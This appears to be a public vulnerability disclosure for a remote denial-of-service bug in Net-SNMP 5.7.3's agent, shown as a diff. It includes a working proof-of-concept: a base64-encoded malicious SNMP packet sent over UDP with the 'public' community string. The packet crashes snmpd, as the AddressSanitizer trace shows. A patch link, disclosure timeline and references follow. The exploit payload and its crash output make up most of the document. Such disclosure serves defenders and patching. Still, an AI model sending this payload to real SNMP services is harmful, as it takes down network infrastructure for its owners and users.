@@ -1,0 +1,77 @@
+     _            _
+    / |   ___ ___| |_ ___ ___ ___ _____ ___
+ _ / /   |   | -_|  _|___|_ -|   |     | . |
+|_|_/    |_|_|___|_|     |___|_|_|_|_|_|  _|
+                                       |_|
+2018-10-08
+
+NET-SNMP REMOTE DOS
+===================
+
+Second bug is remotely exploitable only with knowledge of the community string (in this case "public") leading to Denial of Service:
+
+  # echo -n "MIGfAgEBBAZwdWJsaWOhgZECATwCAQECAUAwgYUwIgYSKwYBBAGBfQgzCgIBBwqG3rc1BAwxNzIuMzEuMTkuNzMwFwYSKwYBAgEBCQEEgQECAAqG3rlgAgECMCMGEgsGAQQBgX0IMwoCAQcKht63NgQNMjU1LjI1NS4yNTUuMDAhBhIrBgECAQEJBgECAQoDAIbetzgECzE3Mi4zMS4xOS4y" | base64 -d > /dev/udp/127.0.0.1/1111
+
+  # net-snmp-5.7.3/agent/snmpd -f -d -V -c ../../snmpd.conf -Ln  127.0.0.1:1111
+  ASAN:SIGSEGV
+  =================================================================
+  ==41062==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000410 (pc 0x00000075bc0f bp 0x7ffdda226b10 sp 0x7ffdda2269e0 T0)
+      #0 0x75bc0e in _set_key /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/helpers/table_container.c:564:9
+      #1 0x75bc0e in _data_lookup /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/helpers/table_container.c:614
+      #2 0x75bc0e in _container_table_handler /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/helpers/table_container.c:749
+      #3 0x572262 in netsnmp_call_handler /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/agent_handler.c:526:15
+      #4 0x572dc4 in netsnmp_call_next_handler /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/agent_handler.c:640:12
+      #5 0x58751c in table_helper_handler /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/helpers/table.c:713:9
+      #6 0x572262 in netsnmp_call_handler /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/agent_handler.c:526:15
+      #7 0x572c79 in netsnmp_call_handlers /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/agent_handler.c:611:14
+      #8 0x520d86 in handle_var_requests /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/snmp_agent.c:2679:22
+      #9 0x524dbe in handle_pdu /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/snmp_agent.c:3441:18
+      #10 0x51b976 in netsnmp_handle_request /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/snmp_agent.c:3284:14
+      #11 0x515876 in handle_snmp_packet /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/snmp_agent.c:1990:10
+      #12 0x7f3558 in _sess_process_packet /home/magnus/projects/net-snmp/net-snmp-5.7.3/snmplib/snmp_api.c:5437:7
+      #13 0x7ef331 in _sess_read /home/magnus/projects/net-snmp/net-snmp-5.7.3/snmplib/snmp_api.c:5877:14
+      #14 0x7ed2e0 in snmp_sess_read2 /home/magnus/projects/net-snmp/net-snmp-5.7.3/snmplib/snmp_api.c:5911:10
+      #15 0x7ed2e0 in snmp_read2 /home/magnus/projects/net-snmp/net-snmp-5.7.3/snmplib/snmp_api.c:5502
+      #16 0x4f9286 in receive /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/snmpd.c:1375:15
+      #17 0x4f9286 in main /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/snmpd.c:1118
+      #18 0x7fc1acb11b44 in __libc_start_main /build/glibc-6V9RKT/glibc-2.19/csu/libc-start.c:287
+      #19 0x4f617c in _start (/home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/snmpd+0x4f617c)
+
+  AddressSanitizer can not provide additional info.
+  SUMMARY: AddressSanitizer: SEGV /home/magnus/projects/net-snmp/net-snmp-5.7.3/agent/helpers/table_container.c:564 _set_key
+  ==41062==ABORTING
+
+
+PATCHES
+=======
+
+Vuln#2: sourceforge.net/p/net-snmp/code/ci/7ffb8e25a0db851953155de91f0170e9bf8c457d
+
+
+TIMELINE
+========
+
+2015-04-11 Vendor releases patch of bug#1 in version control - no public article or otherwise disclosure
+2016-10-06 Vendor releases patch of bug#2 in version control - no public article or otherwise disclosure
+2018-01-05 I discovered both bugs
+2018-01-08 Vendor notified
+2018-01-08 Vendor responds - bugs already fixed in version control repo
+2018-10-08 Public disclosure of exploit
+
+PROOF OF DISCOVERY
+==================
+
+ # cat vuln2 | base64
+  MIGfAgEBBAZwdWJsaWOhgZECATwCAQECAUAwgYUwIgYSKwYBBAGBfQgzCgIBBwqG3rc1BAwxNzIu
+  MzEuMTkuNzMwFwYSKwYBAgEBCQEEgQECAAqG3rlgAgECMCMGEgsGAQQBgX0IMwoCAQcKht63NgQN
+  MjU1LjI1NS4yNTUuMDAhBhIrBgECAQEJBgECAQoDAIbetzgECzE3Mi4zMS4xOS4y
+  # sha256sum vuln2
+  b7f0e494b8a91c6fedb7e13b3b8dab68a951b5fdc21dd876ae91eb86924018f2  vuln2
+  twitter.com/magnusstubman/status/949520565064404994
+
+
+REFERENCES
+==========
+
+- sourceforge.net/p/net-snmp/bugs/2820
+- sourceforge.net/p/net-snmp/bugs/2819
